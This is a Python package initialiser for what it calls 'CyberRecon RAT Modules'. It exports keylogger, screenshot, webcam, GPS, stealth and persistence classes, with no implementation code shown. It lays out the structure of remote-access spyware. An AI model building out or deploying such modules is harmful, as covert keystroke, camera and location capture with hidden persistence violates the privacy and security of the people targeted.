"""
CyberRecon RAT Modules
"""

from .gps import GPSLocator
from .keylogger import Keylogger
from .persistence import PersistenceManager
from .screenshot import ScreenshotCapture
from .stealth import StealthModule
from .webcam import WebcamCapture

__all__ = [
    "Keylogger",
    "ScreenshotCapture",
    "WebcamCapture",
    "GPSLocator",
    "StealthModule",
    "PersistenceManager"
]
